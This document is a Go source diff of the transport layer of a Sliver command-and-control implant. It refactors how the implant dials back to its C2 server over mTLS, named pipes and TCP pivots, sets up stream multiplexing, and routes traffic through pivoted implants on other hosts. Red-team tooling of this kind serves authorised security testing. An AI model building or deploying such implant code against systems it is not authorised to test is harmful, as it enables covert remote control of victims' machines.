@@ -19,25 +19,26 @@ package transports
 */
 
 import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
 	"errors"
 	"fmt"
 	"io"
-	"log"
 	"net"
 	"net/url"
 	"strconv"
 	"sync"
 	"time"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
 	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
 )
 
-// Transport - A wrapper around a physical connection, embedding what is necessary to perform connection
-// multiplexing, and RPC layer management around these muxed logical streams. This allows to have different
-// RPC-able streams for parallel work on an implant.
+// Transport - A wrapper around a physical connection, embedding what is necessary to perform
+// connection multiplexing, and RPC layer management around these muxed logical streams.
+// This allows to have different RPC-able streams for parallel work on an implant.
 // Also, these multiplexed streams can be used to route any net.Conn traffic.
 // Some transports use an underlying "physical connection" that is not/does not yield a
 // net.Conn stream, and are therefore unable to use much of the Transport infrastructure.
@@ -55,7 +56,7 @@ type Transport struct {
 	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
 	// but it nonetheless plays the same role. This conn can be nil if the underlying
 	// "physical connection" does not yield a net.Conn.
-	conn net.Conn
+	Conn net.Conn
 
 	// Multiplexer - Able to derive stream from the physical conn above.
 	Multiplexer *yamux.Session
@@ -114,7 +115,7 @@ ConnLoop:
 				// {{end}}
 				lport = 8888
 			}
-			t.conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
+			t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[mtls] Connection failed %s", err)
@@ -134,6 +135,7 @@ ConnLoop:
 				connectionAttempts++
 			}
 			t.IsMux = false
+			break ConnLoop
 			// {{end}} - DNSc2Enabled
 		case "https":
 			fallthrough
@@ -147,10 +149,11 @@ ConnLoop:
 				connectionAttempts++
 			}
 			t.IsMux = false
+			break ConnLoop
 			// {{end}} - HTTPc2Enabled
 		case "namedpipe":
 			// {{if .Config.NamePipec2Enabled}}
-			t.conn, err = namePipeDial(t.URL)
+			t.Conn, err = namePipeDial(t.URL)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[namedpipe] Connection failed %s", err)
@@ -158,6 +161,7 @@ ConnLoop:
 				connectionAttempts++
 			}
 			t.IsMux = true
+			break ConnLoop
 			// {{end}} -NamePipec2Enabled
 		case "tcppivot":
 			// {{if .Config.TCPPivotc2Enabled}}
@@ -169,8 +173,8 @@ ConnLoop:
 				connectionAttempts++
 			}
 			t.IsMux = false // For the moment...
+			break ConnLoop
 			// {{end}} -TCPPivotc2Enabled
-
 		default:
 			err = fmt.Errorf("Unknown c2 protocol %s", t.URL.Scheme)
 			// {{if .Config.Debug}}
@@ -183,50 +187,14 @@ ConnLoop:
 	// If the underlying protocol stack allows us to do stream mux, set it up.
 	// If not, all C2 RPC layer is already set for this transport.
 	if t.IsMux {
-
-		// The C2 server is here the yamux.Client requiring to open a session.
-		t.Multiplexer, err = yamux.Server(t.conn, nil)
+		err = t.setupMultiplexer()
 		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("[mux] Error setting up Multiplexer server: %s", err)
-			// {{end}}
-			return t.phyConnFallBack()
+			t.phyConnFallBack() // Fallback to RPC around physical conn
 		}
 
-		// We wait for the first stream being instantiated over the connection
-		// and add the RPC layer to it. If an error arises or if we timeout, we
-		// fall back to wrapping the RPC around the transport's physical conn.
-		var inbound = make(chan net.Conn, 1)
-		var timedOut = make(chan struct{}, 1)
-		go func(timedOut chan struct{}) {
-			select {
-			default:
-				// {{if .Config.Debug}}
-				log.Printf("[mux] Waiting for CC to open C2 stream...")
-				// {{end}}
-				stream, _ := t.Multiplexer.Accept()
-				inbound <- stream
-				return
-			case <-timedOut:
-				return
-			}
-		}(timedOut)
-
-		select {
-		case stream := <-inbound:
-			t.C2, err = t.SetupC2RPC(stream)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("Error: setting RPC C2: %s", err)
-				err = t.phyConnFallBack()
-			}
-		case <-time.After(defaultNetTimeout):
-			close(timedOut)
-			close(inbound)
-			// {{if .Config.Debug}}
-			log.Printf("[mux] timed out waiting muxed stream for RPC C2 layer")
-			// {{end}}
-			err = t.phyConnFallBack()
+		// If everything is fine, setup RPC C2 code over a muxed stream.
+		if err == nil {
+			t.SetupMuxC2() // This function handles all errors and edge cases.
 		}
 	}
 
@@ -238,6 +206,59 @@ ConnLoop:
 	// {{if .Config.Debug}}
 	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
 	// {{end}}
+	return
+}
+
+// StartMuxPivot - Given a physical connection as parameter, we setup multiplexing,
+func (t *Transport) StartMuxPivot(conn net.Conn) (err error) {
+
+	t.Conn = conn
+
+	// Setup multiplexing first, and return if any error.
+	// The implant here acts as the C2 server.
+	t.Multiplexer, err = yamux.Client(t.Conn, nil)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error setting up (pivot) multiplexer client: %s", err)
+		// {{end}}
+		return
+	}
+
+	return
+}
+
+// HandleReverseC2 - The transport's other end is a pivoted implant, and we
+// handle the first stream over which the pivoted implant will speak RPC.
+// This function will probably be rewritten, given that transports will have to handle
+// various types of traffic like UDP connections, and that routing will have to be efficient
+// for those as well.
+func (t *Transport) HandleReverseC2(routeID uint32) (err error) {
+	// As the server is a client when setting up C2 RPC stream, we act as the server
+	// and request to open a stream. The pivoted implant is listening for this.
+	src, err := t.Multiplexer.Open()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error opening C2 stream: %s", err)
+		// {{end}}
+		return
+	}
+
+	// Connect back with the route ID provided and route the connection.
+	var route bon.Route = bon.Route(routeID)
+
+	dst, err := ServerComms.Router.Connect(route)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[route] Error connecting to next node: %s", err.Error())
+		// {{end}}
+		return
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Outbound stream: muxing conn and piping")
+	// {{end}}
+
+	transport(src, dst) // Pipe connection
+
 	return
 }
 
@@ -274,16 +295,68 @@ func (t *Transport) StartFromConn(conn net.Conn) (err error) {
 	}
 	t.Inbound <- stream // The stream will be routed back to server.
 	// {{if .Config.Debug}}
-	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.conn.LocalAddr(), t.conn.RemoteAddr())
+	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.Conn.LocalAddr(), t.Conn.RemoteAddr())
 	// {{end}}
 
 	return
 
 }
 
-// SetupC2RPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
+func (t *Transport) setupMultiplexer() (err error) {
+	// The C2 server is here the yamux.Client requiring to open a session.
+	t.Multiplexer, err = yamux.Server(t.Conn, nil)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error setting up Multiplexer server: %s", err)
+		// {{end}}
+	}
+	return
+}
+
+// SetupMuxC2 - The transport waits for the server to mux the first stream and handles any error.
+func (t *Transport) SetupMuxC2() (err error) {
+	// We wait for the first stream being instantiated over the connection
+	// and add the RPC layer to it. If an error arises or if we timeout, we
+	// fall back to wrapping the RPC around the transport's physical conn.
+	var inbound = make(chan net.Conn, 1)
+	var timedOut = make(chan struct{}, 1)
+	go func(timedOut chan struct{}) {
+		select {
+		default:
+			// {{if .Config.Debug}}
+			log.Printf("[mux] Waiting for CC to open C2 stream...")
+			// {{end}}
+			stream, _ := t.Multiplexer.Accept()
+			inbound <- stream
+			return
+		case <-timedOut:
+			return
+		}
+	}(timedOut)
+
+	select {
+	case stream := <-inbound:
+		t.C2, err = t.setupC2RPC(stream)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error: setting RPC C2: %s", err)
+			err = t.phyConnFallBack()
+		}
+	case <-time.After(defaultNetTimeout):
+		close(timedOut)
+		close(inbound)
+		// {{if .Config.Debug}}
+		log.Printf("[mux] timed out waiting muxed stream for RPC C2 layer")
+		// {{end}}
+		t.phyConnFallBack()
+	}
+
+	return
+}
+
+// setupC2RPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
 // The stream parameter is not "tracked" or "registered" by ourselves, but we should need to.
-func (t *Transport) SetupC2RPC(stream net.Conn) (c2 *Connection, err error) {
+func (t *Transport) setupC2RPC(stream net.Conn) (c2 *Connection, err error) {
 
 	if stream == nil {
 		return nil, errors.New("Attempted to setup RPC layer around nil net.Conn")
@@ -363,11 +436,11 @@ func (t *Transport) Stop(force bool) (err error) {
 	}
 
 	// Just check the physical connection is not nil and kill it if necessary.
-	if t.conn != nil {
+	if t.Conn != nil {
 		// {{if .Config.Debug}}
-		log.Printf("killing physical connection (%s  ->  %s", t.conn.LocalAddr(), t.conn.RemoteAddr())
+		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
 		// {{end}}
-		return t.conn.Close()
+		return t.Conn.Close()
 	}
 
 	// {{if .Config.Debug}}
@@ -378,9 +451,9 @@ func (t *Transport) Stop(force bool) (err error) {
 
 // HandleRouteConn - The transport is asked to route a stream given a route parameter.
 // It determines the position of the implant in the route nodes, and depending on this,
-// it either pipes the connection  through another transport (a pivoted implant), or
-// it directly dials hosts on the implant's host subnet.
-func (t *Transport) HandleRouteConn(route *sliverpb.Route, src net.Conn) error {
+// it either pipes the connection  through another transport (a pivoted implant), or it
+// directly dials hosts on the implant's host subnet.
+func (t *Transport) HandleRouteConn(route *pb.Route, src net.Conn) error {
 
 	// {{if .Config.Debug}}
 	log.Printf("[route] routing connection (ID: %d, Dest: %s)", route.ID, src.RemoteAddr())
@@ -393,11 +466,10 @@ func (t *Transport) HandleRouteConn(route *sliverpb.Route, src net.Conn) error {
 	if len(route.Nodes) == 1 {
 
 	} else if len(route.Nodes) > 1 {
-		// Set up stream handle function: we find the transport connected
-		// to next node in chain, and give it the conn to be handled.
+		// We find the transport connected to next node in chain, and give it the conn to be handled.
 		for _, t := range Transports.Active {
 			next := route.Nodes[1]
-			if t.URL.String() == next.Addr {
+			if t.URL.String() == next.Addr { // Change this, not reliable way to find the good transport.
 
 				dst, err := t.Router.Connect(routeID)
 				if err != nil {
@@ -445,7 +517,7 @@ func (t *Transport) phyConnFallBack() (err error) {
 	}
 
 	// Wrap RPC layer around physical conn.
-	t.C2, err = t.SetupC2RPC(t.conn)
+	t.C2, err = t.setupC2RPC(t.Conn)
 
 	return
 }
